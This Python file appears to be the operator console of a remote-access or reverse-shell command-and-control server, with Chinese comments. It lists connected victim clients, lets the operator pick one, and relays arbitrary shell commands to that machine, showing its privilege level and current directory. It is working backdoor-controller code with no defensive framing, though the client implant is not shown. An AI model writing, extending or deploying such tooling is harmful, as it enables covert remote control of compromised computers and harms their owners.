import subprocess
import sys
import threading

from common.util import parse
from server.config import SOCKET_ADDR
from server.core import Server
from server.util import *


def start_cli():
    os.system('')
    while True:
        try:
            command = colored_input('flc> ')
            if not command:
                continue
            # 清屏
            elif command in ['cls', 'clear']:
                subprocess.call('cls', shell=True)
            # 切换目录
            elif command.split()[0] == 'cd':
                cd(parse(command)[1])
            # 退出服务端
            elif command in ['quit', 'exit']:
                server.socket.close()
                sys.exit(0)
            # 查看客户端列表
            elif command in ['l', 'list']:
                server.test_connections()
                list_connections()
            # 连接到客户端
            elif 'select' in command:
                server.test_connections()
                connection = None
                try:
                    connection = server.connections[int(command.replace('select', ''))]
                except (ValueError, IndexError):
                    print('[-] Not a valid selection')
                if connection is not None:
                    open_connection(connection)
            # 快速连接到最近上线的客户端
            elif command == 'q':
                server.test_connections()
                connection = None
                try:
                    connection = server.connections[len(server.connections) - 1]
                except IndexError:
                    print('[-] No connection at this time')
                if connection is not None:
                    open_connection(connection)
            else:
                print('[-] Command not recognized')
        except KeyboardInterrupt:
            print(colors.RESET)
            server.socket.close()
            sys.exit(0)
        except Exception as e:
            print('[-] Error: {}'.format(e))


def list_connections():
    for i, connection in enumerate(server.connections):
        print('{} {}'.format(i, connection.info))


def open_connection(connection):
    connection.send_command('null', 'null')
    cwd = connection.recv_result()[1]
    print('[+] Connected to {}'.format(connection.address))
    funcs = get_funcs()
    user_type = get_user_type(connection.info['integrity'])
    while True:
        try:
            command = colored_input(f'{cwd}{colors.BRIGHT_GREEN}({user_type}){colors.END}> ')
            if not command:
                continue
            name, arg = parse(command)
            if command in ['quit', 'exit']:
                break
            elif command == 'kill':
                connection.send_command(command)
                break
            # 切换到最新的连接
            elif command == 'q':
                server.test_connections()
                conn = None
                try:
                    conn = server.connections[len(server.connections) - 1]
                except IndexError:
                    print('[-] No connection at this time')
                if conn == connection:
                    continue
                if conn is not None:
                    open_connection(conn)
                break
            elif name in funcs:
                if not funcs[name](arg, connection):
                    continue
            else:
                connection.send_command(command)
            status, result = connection.recv_result()
            if not status:
                result = colors.BRIGHT_RED + result + colors.RESET
            print(result)
            cwd = connection.recv_result()[1]
        except ConnectionResetError:
            print('[-] Connection closed')
            break
        except KeyboardInterrupt:
            print(colors.RESET)
            break
        except Exception as e:
            print('[-] Error: {}'.format(e))


if __name__ == '__main__':
    server = Server(SOCKET_ADDR)
    threading.Thread(target=server.serve, daemon=True).start()
    start_cli()
